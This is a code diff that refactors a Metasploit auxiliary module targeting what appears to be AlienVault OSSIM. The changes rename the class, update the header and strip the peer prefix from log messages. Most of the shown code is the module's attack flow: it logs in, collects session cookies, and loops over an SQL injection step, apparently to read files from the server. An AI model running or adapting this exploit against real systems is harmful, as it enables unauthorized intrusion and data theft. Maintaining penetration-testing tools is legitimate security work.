@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
-## Current source: https://github.com/rapid7/metasploit-framework
-###
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info={})
@@ -42,26 +39,26 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('USERNAME', [ true, 'Single username' ]),
         OptString.new('PASSWORD', [ true, 'Single password' ]),
         OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ])
-      ], self.class)
+      ])
 
   end
 
   def run
 
-    print_status("#{peer} - Get a valid session cookie...")
+    print_status("Get a valid session cookie...")
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')
     })
 
     unless res and res.code == 200
-      print_error("#{peer} - Server did not respond in an expected way")
+      print_error("Server did not respond in an expected way")
       return
     end
 
     cookie = res.get_cookies
 
     if cookie.blank?
-      print_error("#{peer} - Could not retrieve a cookie")
+      print_error("Could not retrieve a cookie")
       return
     end
 
@@ -73,7 +70,7 @@ class Metasploit4 < Msf::Auxiliary
       'pass' => Rex::Text.encode_base64(datastore['PASSWORD'])
     }
 
-    print_status("#{peer} - Login...")
+    print_status("Login...")
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
@@ -83,19 +80,19 @@ class Metasploit4 < Msf::Auxiliary
     })
 
     unless res and res.code == 302
-      print_error("#{peer} - Server did not respond in an expected way")
+      print_error("Server did not respond in an expected way")
       return
     end
 
     unless res.headers['Location'] && res.headers['Location'] == normalize_uri(target_uri.path, 'ossim/')
-      print_error("#{peer} - Authentication failed")
+      print_error("Authentication failed")
       return
     end
 
     cookie = res.get_cookies
 
     if cookie.blank?
-      print_error("#{peer} - Could not retrieve the authenticated cookie")
+      print_error("Could not retrieve the authenticated cookie")
       return
     end
 
@@ -105,7 +102,7 @@ class Metasploit4 < Msf::Auxiliary
     left_marker = Rex::Text.rand_text_alpha(6)
     right_marker = Rex::Text.rand_text_alpha(6)
 
-    print_status("#{peer} - Exploiting SQLi...")
+    print_status("Exploiting SQLi...")
 
     loop do
       file = sqli(left_marker, right_marker, i, cookie, filename)
@@ -147,6 +144,5 @@ class Metasploit4 < Msf::Auxiliary
       return nil
     end
   end
-
 end
 
